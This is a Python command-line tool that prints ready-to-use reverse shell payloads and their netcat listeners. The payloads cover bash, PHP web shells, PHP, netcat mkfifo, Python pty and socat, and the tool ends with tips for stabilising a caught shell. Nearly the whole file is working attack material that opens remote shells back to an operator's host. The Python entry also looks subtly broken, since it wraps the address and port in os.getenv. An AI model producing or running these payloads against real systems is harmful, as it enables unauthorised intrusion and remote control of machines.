import argparse
import sys

DEFAULT_LISTENER = 'nc -lvp {port}'

RSH_MAP = {
    'bash': {
            'rsh': {
                'simple': ('{shell} -i >& /dev/udp/{ip}/{port} 0>&1', DEFAULT_LISTENER)
            }
    },
    'php': {
        'shell': {
            'simple': ('<?php if (isset($_GET["cmd"])) {{ system($_GET["cmd"]); }} ?>', 'http://path/to/shell.php?cmd=id'),
            'simple.small': ('<?=`$_GET["cmd"]`?>', 'http://path/to/shell.php?cmd=id')
        },
        'rsh': {
            'exec': ('php -r \'$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");\'', DEFAULT_LISTENER)
        }
    },
    'nc': {
        'rsh': {
            'mkfifo': ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {shell} -i 2>&1 |nc {ip} {port} >/tmp/f', DEFAULT_LISTENER),
            'simple': ('nc {ip} {port} | {shell} -i 2>&1 | nc {ip} {port_2}', 'nc -lvp {port} | nc -lvp {port_2}')
        }
    },
    'python': {
        'rsh': {
            'pty': ('python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("{ip}"),int(os.getenv("{port}"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")\'', DEFAULT_LISTENER)
        }
    },
    'socat': {
        'rsh': {
            'simple': ('socat TCP:{ip}:{port} EXEC:{shell}', DEFAULT_LISTENER)
        }
    },
}

examples = '''
--name:
'''
for lang, types in RSH_MAP.items():
    for rsh_type, rshs in types.items():
        for name, (code, listener) in rshs.items():
                examples += f'\n\n  - {lang}.{rsh_type}.{name}'
                examples += f'\n    {code}'
                examples += f'\n    {listener}'


examples += '''

# HINT 
  once you are connected you can stabilize your shell:
  
  python -c 'import pty;pty.spawn("/bin/bash")'
  CTRL+z
  stty raw -echo; fg; reset
  <press enter 1 or 2 times>
  
---------------------------------------------------

  more RSHs at https://www.revshells.com/
 
'''
parser = argparse.ArgumentParser(epilog=examples, formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument(
    '-n', '--name',
    required=True, help='the name of the RSH you want to generate (-h will show you them)'
)
parser.add_argument(
    '-ip', '--ip-address',
    required=True, help='the ip address where the RSH has to connect to'
)
parser.add_argument(
    '-p', '--port',
    type=int, required=True, help='the port where the RSH has to connect to'
)
parser.add_argument(
    '-s', '--shell',
    default='/bin/bash', help='the shell to use for the RSH (/bin/bash)'
)
parser.add_argument(
    '-l', '--show-listener',
    action=argparse.BooleanOptionalAction, default=False, help='shows the listener for a given --name'
)


args = parser.parse_args()

found = False
for lang, types in RSH_MAP.items():
    for rsh_type, rshs in types.items():
        for name, (code, listener) in rshs.items():
            if args.name == f'{lang}.{rsh_type}.{name}':
                if args.show_listener:
                    print(listener.format(ip=args.ip_address, port=args.port, port_2=args.port + 1, shell=args.shell))
                else:
                    print(code.format(ip=args.ip_address, port=args.port, port_2=args.port + 1, shell=args.shell))
                found = True

if not found:
    print(f'[!] --name "{args.name}" not found', file=sys.stderr)
